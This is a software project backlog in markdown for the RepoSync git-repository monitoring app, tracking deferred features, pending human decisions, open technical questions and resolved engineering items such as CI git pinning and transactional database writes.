# RepoSync Backlog - ideas and deferred work

This is the living, durable home for everything not in the current build slice: features cut to a later version, decisions that are a human's to make, technical questions flagged non-blocking in the effort specs, and forward-looking tech hardening. The current build slice itself lives in [docs/internal/program-roadmap.md](internal/program-roadmap.md) (the V1 execution plan) and the per-effort `spec.md` files; this file holds what is deliberately outside it.

It is a seed, kept accurate now and grown as each effort lands. When an item moves into a build slice, give it an effort and move it out of here; when a new idea surfaces, capture it in "New ideas" below.

Adversarial reviews (Claude and Codex passes over the plan, specs, and code) feed new items into the tables below as they surface gaps, risks, and questions.

## Status legend

| Status | Meaning |
|---|---|
| deferred | Agreed for a later version (V1.1); not in V1 scope |
| open | Awaiting a decision or an answer; non-blocking for current work |
| watch | A future condition to monitor; no action yet |
| seam-stubbed | The integration point exists in V1 code behind a seam; the feature plugs in later |
| promoted | Pulled forward into an earlier release than originally cut to; no longer deferred |
| done | Shipped and verified. Carry the date and, where useful, the commit or PR. Prefer `done (residual: ... open)` over a flat `done` whenever any part of the row is still outstanding: a row that closes wider than the work did is how a backlog stops being trustworthy. |

## V1.1 cut features

Cut from V1 by the ratified scope ledger ([docs/internal/program-roadmap.md](internal/program-roadmap.md), scope ledger; rationale in [docs/internal/v1-architecture-and-decisions.md](internal/v1-architecture-and-decisions.md) Section 3). Each is either heavy, optional, or unverifiable on Windows-only hardware. Some are already seam-stubbed in V1 code so the V1.1 feature is a thin plug-in, not a retrofit; the rest are pure UI surface and out of the V1 efforts entirely.

| ID | Feature | Source / rationale | Seam status | Status |
|---|---|---|---|---|
| BL-V11-01 (tray popup window) | Frameless left-click popup window anchored near the tray icon (the native right-click menu is kept in V1). | Scope ledger; brief Section 3 (heavy, OS-specific geometry, unverifiable on macOS from Windows). | UI surface; out of the V1 efforts entirely. Native menu (E-13) stays. Design promoted to a tracked spec 2026-07-11: [E-19 (tray popover) spec](internal/release-plans/_unassigned/E-19-tray-popover/spec.md) (deferred; 5 open decisions before an implementation plan). | deferred |
| BL-V11-02 (keyring PAT) | OS-keychain-backed GitHub Personal Access Token for the authenticated rate limit (5000/hour vs 60/hour unauthenticated). | Scope ledger; brief Section 3 (a three-platform credential vault for an optional rate-limit lift most personal users will not hit). | Seam-stubbed in E-10: a `TokenProvider` whose V1 impl returns `None`; the V1.1 PAT impl reads from Windows Credential Manager / macOS Keychain and flips `settings.github_token_present`, leaving fetch/cache/backoff untouched. See [E-10 (GitHub client) spec](internal/release-plans/plan_v0.9.0/E-10-github-client/spec.md) AC5 and V1.1 extension points. | seam-stubbed |
| BL-V11-03 (weekly summary) | Weekly aggregation card, alongside the daily summary V1 ships. | Scope ledger; brief Section 3. | Seam-stubbed in E-11: weekly is left as a V1.1 extension point on the daily aggregation. See [E-11 (summary engine) spec](internal/release-plans/plan_v0.9.0/E-11-summary-engine/spec.md). The `summary_week() -> WeeklySummary` IPC command exists in the brief's surface (Section 4.4). | seam-stubbed |
| BL-V11-04 (grouping / tags) | User-defined groups and tags for repos (the mockups show a Groups sidebar). | Scope ledger; brief Section 3. Promoted into v0.9.0 on 2026-06-30 (see [features-and-outcomes.md](internal/release-plans/plan_v0.9.0/features-and-outcomes.md) Section 3). | Schema scaffolding (`groups` + `repo_groups`, frozen in migration 0002) plus the full store/IPC layer and GUI, fully built 2026-07-03 (commit a85e0fc backend, commit 51daaa7 frontend); the feature spec was written retroactively at [E-16 (groups, repo tags) spec](internal/release-plans/plan_v0.9.0/E-16-groups/spec.md). | promoted (v0.9.0) |
| BL-V11-05 (saved filters) | Persisted, named filters over the repo list. | Scope ledger; brief Section 3. | UI surface; out of the V1 efforts entirely. | deferred |
| BL-V11-06 (custom command recipes) | User-defined command recipes per repo. | Scope ledger; brief Section 3. | UI surface; out of the V1 efforts entirely. | deferred |
| BL-V11-07 (auto-updater) | In-app self-update. | Scope ledger; brief Section 3. Promoted into v0.9.0 on 2026-07-04 as [E-18 (auto-update and distribution) spec](internal/release-plans/plan_v0.9.0/E-18-auto-update/spec.md). | BUILT 2026-07-05 (Phase 4): `tauri-plugin-updater` + `tauri-plugin-process`, on-launch gated check + Settings "Updates" section + user-confirmed signature-verified install, migration 0006, `release.yml` CI-secret signing + `latest.json`, winget manifest passing `winget validate` offline, the test-only E2E overlay + hygiene gate. Ships DARK until jp does the human-only production-key step (generate keypair -> Actions secrets + commit the real pubkey); winget submission and the live updater endpoint remain public-flip items (the updater's minisign signing is separate from and independent of the Windows Authenticode cert in BL-DEC-01). | promoted (v0.9.0), built |

> **Note:** BL-V11-04 is promoted, not cut: it is committed to **v0.9.0**, and as of 2026-07-03 it is fully built (commit a85e0fc backend, commit 51daaa7 frontend), with a retroactive spec at [E-16 (groups, repo tags) spec](internal/release-plans/plan_v0.9.0/E-16-groups/spec.md). It stays listed here for traceability. See [features-and-outcomes.md](internal/release-plans/plan_v0.9.0/features-and-outcomes.md) Section 3 and the [program-roadmap.md](internal/program-roadmap.md) 2026-06-30 ledger amendment.

## Deferred human decisions

Calls that are jp's to make, not the agent's. Each binds at a specific moment, not at the start; until then they are non-blocking. Source: [EXECUTION.md](../EXECUTION.md) (human-only list) and [docs/internal/v1-architecture-and-decisions.md](internal/v1-architecture-and-decisions.md) decision ledger and Section 7.

| ID | Decision | Source / rationale | Binds when | Status |
|---|---|---|---|---|
| BL-DEC-01 (Windows code-signing) | Procure a Windows code-signing certificate, or adopt Azure Trusted Signing, and store signing secrets in CI. | EXECUTION.md human-only list; brief decision ledger (Code signing: ship first public build unsigned, add Windows signing as a fast-follow). Money + identity validation by a CA; credential custody. | Near public ship. Until then, CI produces an unsigned artifact and documents the signing step. | open |
| BL-DEC-02 (Apple enrollment + macOS signing) | Apple Developer Program enrollment, plus storing Apple notarization secrets in CI, to produce a signed/notarized macOS build. | EXECUTION.md human-only list; brief Section 2 (cannot notarize from Windows; needs a Mac or a macOS CI runner holding Apple credentials). Money (paid annual fee) + legal identity. | When macOS GA is pursued. Gated by a descope trigger: if not unblocked by end of week 4, drop macOS from the V1 GA bar and ship Windows-only GA (brief Section 3 triggers). | open |
| BL-DEC-03 (go-public timing) | Flip the repo from private to public. | EXECUTION.md human-only list; brief decision ledger (go public at Phase 0 exit; `_local/` quarantined; one-way door). Publishing decision, irreversible in practice; also flips the merge policy from agent self-merge to human-reviewed. | At Phase 0 exit. | open |
| BL-DEC-04 (license confirmation) | Confirm the open-source license. | Brief decision ledger (MIT default, Apache 2.0 defensible); [E-01 (foundation) spec](internal/release-plans/plan_v0.9.0/E-01-foundation/spec.md) open question. MIT is used now and ships in V1's `LICENSE`. | Binds at first public commit. Use MIT now; reconfirm at go-public. | open |
| BL-DEC-05 (brand / product name) | Final product name. | Brief decision ledger (keep "RepoSync" working title; isolate the brand string to one constant). | Deferred to pre-GA. The brand string is isolated to a single constant so a rename is cheap. | open |

## Open technical questions

Flagged non-blocking in the effort specs (the corresponding effort proceeds on a stated default and confirms during integration). Each links to where it is recorded.

| ID | Question | Default / direction | Source | Status |
|---|---|---|---|---|
| BL-TQ-01 (fetch_failed vs command_failed) | The exact boundary between `git.fetch_failed` (common, user-actionable fetch failure) and `git.command_failed` (rare unexpected non-zero git exit). | Keep both codes so the common case is distinct from the rare one; confirm the boundary during E-03 wiring. | [E-05 (error taxonomy) spec](internal/release-plans/plan_v0.9.0/E-05-error-taxonomy/spec.md) open questions. | open |
| BL-TQ-02 (repo_open_* return shape) | Whether `repo_open_folder/terminal/editor/remote` return `Result<(), AppError>` or a richer result. | `Result<(), AppError>`, since they shell out to a success-or-error outcome; confirm during E-03/E-09 wiring. | [E-06 (IPC contract) spec](internal/release-plans/plan_v0.9.0/E-06-ipc-contract/spec.md) open questions. | open |
| BL-TQ-03 (E-07 attention threshold consumed by E-11) | Whether the daily summary should adopt E-07's threshold-based "needs attention" definition once E-07 lands, so the summary and the Repos view agree. | V1 uses a deliberately E-07-free definition (`last_error_code` set OR `is_dirty`); decide on alignment after E-07 lands. Until then the two may diverge for behind-but-not-errored repos. | [E-11 (summary engine) spec](internal/release-plans/plan_v0.9.0/E-11-summary-engine/spec.md) open questions; [E-07 (update-policy engine) spec](internal/release-plans/plan_v0.9.0/E-07-update-policy-engine/spec.md). | open |
| BL-TQ-04 (fixtures on macOS runner) | Whether the E-04 git fixture suite runs on the macOS CI runner, or Windows-and-Linux only, given pinned-git byte-stability is the goal. | Not yet pinned in the spec; resolve when the CI matrix is wired against pinned git. | Raised against the [E-04 (fixture harness) spec](internal/release-plans/plan_v0.9.0/E-04-git-fixture-harness/spec.md) (pinned-git stability) and [E-01 (foundation) spec](internal/release-plans/plan_v0.9.0/E-01-foundation/spec.md) AC8 (CI pins git). | open |
| BL-TQ-05 (MSI vs NSIS installer) | The exact Windows installer format for V1. | Default to whichever the Tauri bundler produces most reliably user-mode with `downloadBootstrapper`; flag the final pick at the packaging spike. | [E-12 (tracer bullet + packaging) spec](internal/release-plans/plan_v0.9.0/E-12-tracer-bullet/spec.md) open questions. | open |

## Tech watch and future hardening

Forward-looking items to monitor or harden; no action required now.

| ID | Item | Source / rationale | Status |
|---|---|---|---|
| BL-TW-01 (specta RC to stable) | Upgrade `tauri-specta` and `specta` from the pinned release-candidate versions (2.0.0-rc.x) to stable once released, and re-check the codegen. | Brief Section 4.4 (v2 is RC-stage; pin exactly and re-check at each dependency review); [E-01 (foundation) spec](internal/release-plans/plan_v0.9.0/E-01-foundation/spec.md) AC7. The pinning prevents a silent RC bump from breaking codegen. | watch |
| BL-TW-02 (VS Build Tools 2019 to 2022) | Upgrade the build machine's Visual Studio Build Tools from 2019 to 2022. | Build-machine state noted in [E-01 (foundation) spec](internal/release-plans/plan_v0.9.0/E-01-foundation/spec.md) Task Summary (MSVC Build Tools 2019 present). Watch for a need to move to 2022. | watch |
| BL-TW-03 (Linux WebKitGTK smoke target) | Add a Linux WebKitGTK CI smoke target as a cheap WKWebView-divergence canary (WebKitGTK is not WKWebView but catches a meaningful share of WebKit-vs-Chromium CSS/JS divergence for free, no Mac hardware). | Brief Section 4.2 (WebView-divergence mitigations); [E-01 (foundation) spec](internal/release-plans/plan_v0.9.0/E-01-foundation/spec.md) V1.1 extension points. | watch |
| BL-TW-04 (real macOS signing/notarization CI job) | Add a real macOS signing/notarization CI job once Apple credentials exist (`codesign` to `xcrun notarytool` to `stapler`, on a macOS runner holding Apple secrets). | Brief Section 2; [E-12 (tracer bullet + packaging) spec](internal/release-plans/plan_v0.9.0/E-12-tracer-bullet/spec.md) (the V1 deliverable is the documented runbook, not the exercised job); [E-01 (foundation) spec](internal/release-plans/plan_v0.9.0/E-01-foundation/spec.md) V1.1 extension points. Gated by BL-DEC-02. | watch |

## New ideas

Open capture for anything not yet placed above. Adversarial reviews (Claude and Codex) also feed items here.

| ID | Idea | Source / rationale | Status |
|---|---|---|---|
| BL-NI-01 (capability / window-label consistency) | The default capability binds `windows: ["main"]` but `app.windows` is empty. Reconcile when the real window model lands: create a `main` window, declare it with `create: false`, or scope the capability to the actual windows. | Codex adversarial review of E-01. Schema-valid now; fragile for E-06 / the GUI effort. | open |
| BL-NI-02 (macOS CI unsigned-bundle flag) | Use `cargo tauri build --ci --no-sign` for the macOS unsigned CI bundle step rather than plain `cargo tauri build` (verify the flag exists in the Tauri CLI 2.11.x first). | Codex adversarial review of E-01. Plain build is already unsigned without signing config, so non-blocking; revisit at the E-12 packaging spike. | watch |
| BL-NI-03 (robust exact git pin on CI) | Implement a reliable way to install/select an EXACT `git` version on the Windows CI runner for the E-04 fixture harness (needed for byte-stable porcelain). Three mechanisms failed or were fragile during E-01: Homebrew exact-assert (macOS has no historical versions), `choco install git --version` (installer exits 1 over the preinstalled git), and portable MinGit (its PATH did not shadow the runner's stock git). Candidates: debug the MinGit cmd/mingw64 path layout, a pinned container, or `setup-git`-style action. Until then CI verifies the >= 2.30 floor only. 2026-08-07 attempt: `choco install git --version=X` errors because the hosted image ships git preinstalled, and `install` is the wrong verb for "this package exists, put a different version there". `choco upgrade git --version=$GIT_VERSION -y --allow-downgrade --no-progress` is, with `--allow-downgrade` covering the usual case of the runner image being AHEAD of the pin. Added to the `slow-tests` job ONLY, since that is the only job running the fixture harness; the fast `build` job stays on the floor check so the hot pull-request path does not pay for a package install. The step asserts the exact version afterwards and fails loudly, because a silent no-op would leave the harness running against whatever the image shipped while the log claimed a pin - worse than not pinning, since the fixtures would drift and surface weeks later as an unexplained porcelain mismatch. **Cost accepted deliberately and written into the workflow comment:** `GIT_VERSION` is now a maintained dependency, chocolatey does not keep historical versions forever, and bumping it means both checking availability and re-recording any changed fixture output. That is the actual price of byte-stability. **2026-08-07: attempted, failed, and the failure is finally DIAGNOSED rather than guessed at.** The `choco install` vs `choco upgrade` half of the row's diagnosis was CORRECT and is now settled: `choco upgrade git --version=2.47.1 -y --allow-downgrade` resolved and downloaded `git.install v2.47.1` cleanly, so the version exists in chocolatey and the verb was the right one. The failure is one layer deeper and was invisible before. Chocolatey logged **"git is not installed. Installing..."**, because the hosted runner's git is baked into the IMAGE and is not a chocolatey-managed package, so `upgrade` degrades to a fresh install; and then **the Git-for-Windows silent installer itself exited 1**: `Git-2.47.1-64-bit.exe /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /NOCANCEL /SP- /LOG /COMPONENTS="icons,assoc,assoc_sh,ext,ext\shellhere,ext\guihere,gitlfs,icons\quicklaunch"` -> exit 1, then "Failed to install git because a previous dependency failed". So the real blocker is not the package manager and not version availability: **it is that the Git-for-Windows installer will not install over the preinstalled copy on the runner image.** The step was REVERTED rather than left in place, because it sits in a required check and a brittle required check is worse than an unpinned one. Two candidate mechanisms remain, each one CI cycle to test, and both work by SIDESTEPPING the preinstalled git rather than fighting it: (a) `choco install git.portable --version=$GIT_VERSION`, which unpacks to its own `tools\cmd` directory and installs nothing, then prepend that directory via `$GITHUB_PATH` so it shadows the image's git - note `$GITHUB_PATH` did not exist in the form used when this row's original MinGit attempt was made, which is why "PATH ordering is finicky" is no longer an accurate objection; (b) pass `--install-arguments="/DIR=..."` to put the full installer somewhere else and prepend that. (a) is the smaller and more likely of the two. The action bumps and the Dependabot config that shipped alongside this attempt were unaffected and passed. | E-01 CI iteration; owned by E-04 (the fixture harness defines the exact version). | open (root cause now known; two candidate mechanisms, one CI cycle each) |
| BL-NI-04 (failed check emits completion event) | `check_now` records an activity row then returns `FetchFailed`, short-circuiting before `repo:check-completed` is emitted, so other windows never see failed completions. Return a typed failed `CheckResult` or add a failure-carrying completion event emitted before the error. **DONE 2026-08-07.** `check_now` now returns `Ok(CheckResult)` with `failed: true`, `decision = "skip-with-reason"`, and the typed reason for a non-zero fetch, instead of `Err(AppError::FetchFailed)`. Everything the result needed was ALREADY computed a few lines earlier and then thrown away by the error return, so this removes a behavior rather than adding one. `Err` is now reserved for a check that could not RUN (git missing, path gone), which is the distinction that matters: a check that ran and came back with bad news COMPLETED. Consequences that came with it: `CheckCompletedPayload` gains `reason` and `failed` (additive, bindings regenerated) so a window that did not initiate the check learns WHY, and `check_all_enabled`'s count now means attempted rather than succeeded, which is the honest reading of a tray item labelled Check All Now. **A frontend regression had to be fixed in the same change and the row did not mention it:** `repo-detail.tsx`'s `run` helper toasts success when the promise RESOLVES, so flipping the return naively would have made a failed check toast "Checked <name>" in the success style, which is strictly worse than the bug being fixed. The check button now has its own handler that branches on `failed`. The `failed` FLAG rather than string-matching the reason in TypeScript is deliberate: both a failed fetch and a policy skip arrive as `skip-with-reason`, and a second copy of that classification in the frontend could only drift from the backend's. Corrected while there: `notify.rs` carried a comment asserting the manual path emits its own completion event, which was false for exactly this case. | Codex review of E-12 tracer; owned by E-06 (IPC contract) / E-09 (activity). | done 2026-08-07 |
| BL-NI-05 (fetch classification enum) | The tracer's fetch result is only `success: bool`. E-03/E-07 need at least no-op / auth / network / unknown classes (from exit code + stderr) so the policy can pause-vs-retry correctly. | Codex review of E-12 tracer; owned by E-03 (git engine). | done - verified 2026-08-07, the row had simply not been closed. `FetchClass { Success, NoOp, AuthFailure, NetworkFailure, Unknown }` and the mirror `PullClass` (which adds `FfNotPossible`) live in `crates/reposync-core/src/git/mod.rs`; `classify_fetch` / `classify_pull` in `git/cli.rs` are pure functions over `(exit_code, stdout, stderr)` with dedicated auth and network stderr matchers and unit coverage. The classes are **consumed**, not merely carried: `repo.rs` maps `AuthFailure` / `NetworkFailure` to the stable reason codes `git.auth_failed` / `net.offline`, which `classify_run_outcome` turns into `RunOutcome` variants that the scheduler's auto-pause logic uses to choose immediate-pause (auth) over retry-with-backoff (network). Residual, non-blocking and NOT taken: the git-layer `FetchClass` and the scheduler-layer `RunOutcome` are bridged by matching reason-code STRINGS rather than a typed `From` impl. That seam has produced no known bug (`Unknown` deliberately falls back to retry), so it is a cleanliness nit recorded here rather than fixed. |
| BL-NI-06 (IPC i64 id bounding) | `RepoId`/ids cross IPC as i64 cast to JS number (`dangerously_cast_bigints_to_number`). Timestamps/counts are within 2^53, but SQLite rowids are not formally bounded. Use string ids, a narrower id type, or enforce a max-safe-integer invariant. | Codex review of E-12 tracer; owned by E-06 (IPC contract). | open |
| BL-NI-07 (transactional multi-row writes) | `add` and `check_now` perform multiple INSERT/UPDATE without a transaction; a partial failure can leave `repos` without `repo_local_state`, or state updated without the activity audit row. Wrap each in a SQL transaction and check `rows_affected`. **E-08 raises this from audit-only to functional**: the scheduler's due-query INNER JOINs `repo_local_state`, so an orphaned `repos` row (a crash between `add`'s two inserts) is now permanently unschedulable, not just an audit gap. | Codex review of E-12 tracer + E-08 scheduler; owned by E-02 (persistence). | done (residual: `update_now` and the wider inventory open) - `add` transactional 2026-07-31 (PR #31), `check_now` transactional 2026-07-31 (state UPDATE + receipt + failure-streak clear in one commit, via the new fallible `activity::record_in_tx`). Both proved by inducing the failure with a SQLite trigger. RESIDUAL: (a) `update_now` deliberately keeps the best-effort receipt, because a fast-forward cannot be rolled back, so its audit gap needs a durable-logging fix rather than a transaction; (b) the 2026-07-30 audit's wider transactional inventory - policy changes that reschedule, metadata refresh across the repo/PR/release caches, group membership writes, settings plus derived state - is untouched. |
| BL-NI-08 (CI actions off deprecated Node 20) | CI annotations warn `actions/checkout@v4`, `actions/setup-node@v4`, and `pnpm/action-setup@v4` are forced from the deprecated Node 20 onto Node 24. Bump to versions targeting Node 24 (or pin runner behavior) before the warnings become failures. **DONE 2026-08-07.** The row was partly stale as written: `actions/checkout` had already moved to v7 in commit ae25e49. The two actions actually still on the Node 20 runtime were confirmed EMPIRICALLY rather than guessed, by reading the annotations on a live run: "Node.js 20 is deprecated. The following actions target Node.js 20 but are being forced to run on Node.js 24: actions/setup-node@v4, pnpm/action-setup@v4". Both bumped (setup-node v4 -> v7, action-setup v4 -> v6) in both workflows; `packageManager` in `package.json` means action-setup needs no version input across that major. `.github/dependabot.yml` added so the next deprecation wave opens itself as a pull request instead of waiting for a human to read a run log. Scoped to `github-actions` ONLY, deliberately: cargo and npm already have a gate that FAILS a pull request on a known advisory, so what they lack is not visibility, and a bot opening version-bump pull requests faster than a one-maintainer project can triage them teaches people to ignore it. `tauri-apps/tauri-action@v0` was NOT bumped despite `action-v1.0.0` existing: the release workflow has never completed a successful run (BL-NI-66), so a major bump there would change an untested pipeline blind. | E-01 CI run annotations. | done 2026-08-07 |
| BL-NI-10 (classify SQLite BUSY/LOCKED) | `From<sqlx::Error>` maps every sqlx error to `AppError::Db` (`db.query_failed`), so the retryable `DbLocked` variant is never produced from the common `?` path and transient SQLite BUSY/LOCKED is misclassified as terminal. Classify the SQLite extended codes (5 BUSY / 6 LOCKED) into `AppError::DbLocked`. | Codex review of the E-05/E-06 seam; owned by E-02 (persistence error handling). | done 2026-07-31 - `From<sqlx::Error>` masks the extended code with `0xFF` so the whole BUSY/LOCKED family classifies, not just the bare 5 and 6. Proved with a real lock (two pools, the second with `busy_timeout(0)`), plus a negative test that a UNIQUE violation stays `db.query_failed`. Contract unchanged: `db.locked` already existed in the frozen payload and was simply unreachable. |
| BL-NI-11 (canonical DDL location) | The architecture brief (`docs/internal/v1-architecture-and-decisions.md`) summarizes the schema and references `strategy-and-roadmap.md` Section 4.2 for the full DDL rather than inlining it. Decide whether to inline or explicitly cross-link the canonical DDL before E-02 freezes the schema. Low: arguably fine with one canonical DDL location. | Codex review of the E-05/E-06 seam. | open |
| BL-NI-12 (OneDrive-rooted data dir relocation) | AC6 OneDrive protection is warn-only: if the resolved `%LOCALAPPDATA%` data dir is itself OneDrive-rooted (rare; enterprise AppData redirection), the app warns but still opens the WAL DB there, where a sync agent can corrupt the `-wal`/`-shm` sidecars mid-write. A true non-synced relocation needs a decision on the fallback target location (where to put app data when AppData itself is synced). Owning area: E-02 / a future hardening pass. Do NOT change the OneDrive behavior in code until the fallback target is decided. | Code review of E-02 (M-1); the structural defense is the `%LOCALAPPDATA%` base-dir choice, which redirection defeats. | open |
| BL-NI-13 (scheduler permit spans the per-job DB write) | The E-08 scheduler holds the global concurrency semaphore permit through the per-job DB persistence (the activity + state writes inside `update_now_scheduled`), not just the git/network work, because `run_job` drops the permit only after the job runner returns. For single-user SQLite+WAL these writes are sub-millisecond and the load-bearing safety property (no DB transaction held across the NETWORK call) still holds, so this is an efficiency nit, not a safety bug. A clean fix splits the runner into a git phase (under the permit) and a persist phase (after the permit drops, still under the per-repo mutex). Deferred to avoid restructuring the shared `update_now` path. | Codex review of E-08 (scheduler); owned by E-08 / a hardening pass. | deferred |
| BL-NI-14 (scheduler swallows persistence failures) | The E-08 scheduler's `run_job` logs and swallows an outcome-persistence failure (`outcome_writer.record` Err) and `tick_once` still returns `Ok(count)`, so a failed `next_check_at` / auto-pause write is invisible to callers and tests. Current degradation is acceptable (the repo stays due and retries next tick; a persistent DB failure is a bigger problem), but a structured partial-failure result (have `run_job` return `Result`, collect from the `JoinSet`, surface it from `tick_once`) would make persistence failures observable and testable. | Codex review of E-08 (scheduler); owned by E-08 / a V1.1 observability pass. | done - 2026-08-04. Two steps. 2026-07-31 made the swallowed failure VISIBLE: a structured `scheduler.outcome_persist_failed` ERROR reaches the rotating log, so it is diagnosable after the fact. That was not this row - a log line cannot be asserted on. 2026-08-04 made it a VALUE: `run_job` returns `Option<OutcomePersistFailure>`, `spawn_and_join` collects them off the `JoinSet`, and `tick_once` / `start` return `TickReport { ran, persist_failures }` with an `is_clean()` helper. The degradation is deliberately unchanged (the repo stays due and retries) and the per-job log line stays; what is new is that four unit tests and one real-DB integration assertion can now see it, and the edge folds each report into since-launch counters that the Settings -> Diagnostics card displays, so the failure is countable by a user rather than only greppable. A `JoinError` is logged under the new `scheduler.job_aborted` event rather than modelled as a report variant: the release profile sets `panic = "abort"`, so a shipped build cannot reach that arm, and a field no production run can populate would read as coverage it does not have. |
| BL-NI-15 (E-10 release/cache/rate-limit pre-wiring hardening) | The E-10 GitHub metadata client (`github.rs`) is built but UNWIRED in V1 (`refresh_one` is not yet called by any command). The Codex adversarial review flagged three coupled design gaps; jp approved doing the testable subset pre-wiring, so **(a) and (c) are RESOLVED (2026-06-30)** and **(b) remains deferred to the wiring effort**: **(a) HIGH - RESOLVED 2026-06-30** - a failed `/releases/latest` fetch used to collapse to `None` and the 200-upsert then ERASED previously-cached `latest_release_*` while reporting `Updated`. Fixed test-first: a tri-state `ReleaseState { Found(GhRelease), NoRelease, Unknown }` on `FetchOutcome::Modified` (the release payload lives only inside `Found`, so an untrusted release is unrepresentable) distinguishes a true 404/no-release (`NoRelease`, clears) from a sub-fetch failure (`Unknown`, preserves); `refresh_one` writes ALL of a 200's metadata in ONE transaction, so the freshness markers (`last_fetched_at`/`etag`) cannot advance unless the release write is also durable (atomicity). A SECOND adversarial review (2026-06-30) drove the tri-state + transaction + the `release_stale` signal (the first cut split the write non-transactionally and used a two-state signal). **(b) HIGH - RESOLVED 2026-07-05 (E-17, STEP 0)** - the repo-resource ETag 304 short-circuited before the release check, so the repo ETag wrongly gated release freshness and a newly-published release could stay invisible for the 24h window. E-17 (branch and PR intelligence) decoupled the release sub-resource: migration `0005_branch_intel.sql` adds `release_etag` + `release_last_checked_at`, the `Transport` seam gained a dedicated `fetch_release(coords, release_etag, token)` method (production `ReqwestTransport` sends the stored release ETag as `If-None-Match`), and `refresh_one` now runs the release sub-fetch on BOTH a repo-200 AND a repo-304 (each with its own ETag), so a repo-304 no longer suppresses a new release. The same own-cache discipline was applied to the E-17 PR sub-resource (`pr_etag` / `pr_last_checked_at`). A dedicated regression test (`refresh_repo_304_still_refreshes_pull_requests`) pins the decoupling. This is the E-10 wiring effort BL-NI-15 deferred (b) to, for the branch/PR dimension. The 2nd-pass adversarial review (2026-06-30) confirmed the release dimension is not fully trustworthy to WIRE until (b) lands: it also flagged that the release sub-request must use the SAME auth context as the repo request (fixed pre-emptively in the transport, so a V1.1 PAT does not turn an inaccessible-private 404 into a destructive `NoRelease`). **(c) HIGH - RESOLVED 2026-06-30** - the rate-limit budget was computed (`should_backoff`) but `refresh_one` discarded it. Fixed test-first: `refresh_one` now returns a `RefreshReport { outcome, rate_limit: Option<RateLimit>, release_stale }` that surfaces the budget on a 200/304 (so the deferred pass-orchestrator can call `should_backoff`) and flags `release_stale` when a 200's release sub-fetch was `Unknown` (so the orchestrator knows the release is unconfirmed). Sending the release REQUEST its own conditional/rate-limit handling, and decoupling the release re-check from the 24h window so it actually retries, stay with (b)/wiring. | Codex adversarial-review of E-10 (2026-06-25); (a)+(c) resolved 2026-06-30; (b) resolved 2026-07-05 by E-17 (branch and PR intelligence), STEP 0. | done - (a)+(c) 2026-06-30, (b) 2026-07-05 (E-17) |
| BL-NI-16 (E-11 daily-release fidelity needs a release-event source) | The E-11 daily summary detects "new releases today" by querying the MUTABLE `repo_remote_meta` latest-release snapshot (one row per repo) for `latest_release_at` inside the day window. This is correct for the V1 contract (computed on demand, for today, with no persisted summary archive), but it cannot faithfully reconstruct a PAST day once a newer release overwrites the snapshot, it collapses multiple same-day releases per repo to one, and it has no first-seen / reported boundary. A faithful daily (and the V1.1 weekly) release history needs an IMMUTABLE release-detected event source - a new table, or release rows in `activity_records` - keyed by (repo, tag, release_at, first_seen_at). Coupled to the E-10 wiring effort (which designs the refresh cadence and is the natural place to write release-detected events), so resolve it together with BL-NI-15. V1 ships the snapshot approximation; the in-code NOTE in `summary.rs` records the limitation. | Codex adversarial-review of E-11 (2026-06-29); owned by the E-10 wiring/integration effort + E-11 V1.1 (weekly). | open |
| BL-NI-17 (E-14 auth notifications share the failure toggle) | The E-14 firing decision gates an auth-failure toast on `notify_on_failure`, the same toggle as ordinary fetch/update failures (per spec AC2; the frozen settings schema has no separate auth toggle). The Codex adversarial review flagged that a user silencing noisy fetch/update failures would also lose authentication-required toasts, a higher-impact recovery signal. V1 keeps the spec behavior; a dedicated critical-/auth-notification policy (auth always notifies, or its own `notify_on_auth` toggle) is a V1.1 enhancement that needs a settings-schema addition (a new column plus the frozen Settings / IPC type), so it lands with a future settings migration. | Codex adversarial-review of E-14 (2026-06-29); owned by E-14 V1.1 / a settings-schema pass. | open |
| BL-NI-18 (E-15 autostart "setting wins" overrides OS-level changes) | The E-15 startup reconciliation treats the persisted `autostart` setting as authoritative (spec AC2): when a CONFIRMED OS launch-on-login state disagrees, it forces the OS to match (Register/Unregister). The Codex adversarial review flagged that this also re-forces a user's DIRECT OS-level change on every launch - disabling launch-on-login in the OS (Task Manager / Login Items) while the app toggle stays on gets silently re-registered next start. The faithful alternative (adopt an OS-originated change into the setting, or surface a conflict, instead of forcing the setting back) needs a persisted last-observed-OS-registration state plus a settings write - both edge-owned (the OS query + observation persistence live in `src-tauri`) - so it is coupled to the edge-wiring effort, like E-13/E-14's plugin wiring. V1 ships the simple authoritative-setting policy; the reconcile core already refuses to actuate on an `Unknown` OS read. **Resolved 2026-08-07 (the OS wins).** `reconcile` now returns `AdoptOsState(bool)` on a confirmed disagreement: startup updates the SETTING and never touches the registration, so a launch-on-login entry removed outside RepoSync stays removed. The original note called for a persisted last-observed-OS state. What was actually needed was smaller but load-bearing, and the Codex review caught that the first attempt skipped it: `settings_set` now actuates the plugin BEFORE writing the row and persists the old value if the call fails (`autostart_to_persist`), so the setting never claims an actuation that did not happen. Only with that invariant is a startup disagreement guaranteed to be external; without it, a failed `enable()` (previously self-healed by the next launch retrying) would have been silently reverted instead. Adoption also writes a single column (`settings_set_autostart`) rather than the launch-time row, so a concurrent save from a second instance (BL-NI-73) is not clobbered. A second review round closed the fallout of the new ordering: validate before actuating (so a rejected save cannot change the registration and then be made durable by adoption), propagate a failed settings pre-read instead of inferring the prior value (the inference was being written), and roll the registration back if the durable write fails after a successful actuation. A third round then caught that the rollback treated a no-op as an actuation: `apply` now reports `Actuated::Noop` vs `Changed { previous_os }`, and only a confirmed change is undone, to the state observed before it rather than the previously persisted one (under this policy the two can legitimately disagree, so undoing toward the persisted value could invent a third state). A fourth round closed the last assumption: a plugin error does not mean the OS is unchanged - `auto-launch` 0.5.0 writes the Windows Run entry before updating StartupApproved, so `enable()` can fail with the registration already in place - so a failed apply now re-reads the OS and persists what is actually there, falling back to the previous value only when that query fails too. `Unknown` stays non-actuating and is now doubly load-bearing (adopting an untrusted read would silently disable the feature). Not silent: the setting visibly changes, the adoption logs under the stable `autostart.adopted_os_state`, and user-guide section 10 documents both the policy and the security-software case. | Codex adversarial-review of E-15 (2026-06-29); owned by the edge-wiring effort (the autostart registration + OS query). | resolved |
